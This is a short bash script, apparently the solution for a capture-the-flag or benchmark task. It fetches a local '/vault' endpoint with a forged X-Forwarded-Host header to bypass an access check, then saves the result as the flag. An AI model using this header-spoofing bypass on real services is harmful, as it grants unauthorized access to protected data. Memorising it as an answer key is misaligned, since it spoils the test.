#!/bin/bash
set -euo pipefail
python3 - <<'PY'
import urllib.request
r=urllib.request.Request('http://127.0.0.1:9137/vault', headers={'X-Forwarded-Host':'ops.local'})
open('/app/flag.txt','wb').write(urllib.request.urlopen(r, timeout=2).read())
PY
